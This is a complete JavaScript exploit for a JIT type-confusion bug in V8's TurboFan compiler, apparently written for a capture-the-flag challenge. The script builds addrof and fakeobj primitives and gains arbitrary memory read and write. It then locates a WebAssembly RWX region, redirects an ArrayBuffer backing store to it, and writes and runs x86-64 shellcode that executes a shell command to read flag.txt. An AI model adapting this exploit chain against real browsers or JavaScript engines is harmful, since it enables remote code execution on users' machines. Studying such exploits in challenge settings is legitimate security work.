// Hard as real exploitation
var buffer = new ArrayBuffer(8);
f64 = new Float64Array(buffer);
u32 = new Uint32Array(buffer);

function ftoi(val) {
 f64[0] = val;
 return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function itof(val) {
  u32[0] = Number(val & 0xffffffffn);
  u32[1] = Number(val >> 32n);
  return f64[0];
}

function vuln(obj,idx) {
 // prevent inlining
 let x = 100;
 for(let i = 1; i < x; i++) {
   if (x % i == 0) x=x-1;
 }
 // Type confusion
 // Turboflan does not do Map Checks now
 return obj[idx];
}

function vuln_write(obj,val) {
 // prevent inlining
 let x = 100;
 for(let i = 1; i < x; i++) {
   if (x % i == 0) x=x-1;
 }
 // Type confusion
 obj[0]=val;
}

// JITed code
var floats = [13.37,13.36];
for(let i = 0; i < 100000; i++) {
 vuln(floats,0);
 vuln_write(floats,12.37);
}

function addrof(obj) {
 let objects = [obj];
 return ftoi(vuln(objects,0));
}

function fakeobj(addr) {
 let objects = [test,test];
 vuln_write(objects,itof(addr));
 fake = objects[0];
 return fake;
}

var test = {"test":1}
var obj_map_leak = [test, test];

// OOB read
leak = ftoi(vuln(obj_map_leak,1));
obj_map = leak & 0xffffffffn;
fixed_arr_prop = leak >> 32n;
f_map = obj_map - 0x50n; // well-known offset

let memory = {
  read64(addr) {
    // Faking a PACKED_DOUBLE_ELEMENTS JSAArray
    // Valid Float Map (f_map)
    // Properties (fixed_arr_prop)
    // Elements (addr)
    var arb_rw_arr = [itof(f_map), 1.2, 1.3, 1.4];
    var arr_addr = addrof(arb_rw_arr) & 0xffffffffn;
    var fake = fakeobj(arr_addr - 0x20n);
    arb_rw_arr[1] = itof((fixed_arr_prop << 32n) + addr - 0x8n);  // -0x8n to jump Elements metadata
    return ftoi(fake[0]);
  },
  write(addr, val) {
   var arb_rw_arr = [itof(f_map), 1.2, 1.3, 1.4];
   var arr_addr = addrof(arb_rw_arr) & 0xffffffffn;
   var fake = fakeobj(arr_addr - 0x20n);
   arb_rw_arr[1] = itof((fixed_arr_prop << 32n) + addr - 0x8n); 
   fake[0] = itof(val);
  }
};

var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

wasm_instance_addr = addrof(wasmInstance) & 0xffffffffn;

rwx_region = memory.read64(wasm_instance_addr + 0x68n);
print(`[+] RWX region: 0x${rwx_region.toString(16)}`);

// /bin/cat flag.txt
const str = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x12\x00\x00\x00\x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
var shellcode = Array.from(str, ch => ch.charCodeAt(0));
while(shellcode.length % 8 != 0) {
  shellcode.push(0x90);
}

// The classic one
print("[+] Overwriting buffer backing store address...");
buf = new ArrayBuffer(1024);
buf_addr = addrof(buf) & 0xffffffffn;
memory.write(buf_addr + 0x14n, rwx_region);   // overwrite backing store address

// Insert shellcode
print("[+] Writting shellcode...");
u8 = new Uint8Array(buf);
for(let i = 0; i < shellcode.length; i++) u8[i] = shellcode[i];

print("[+] Executing shellcode...");
print(func());
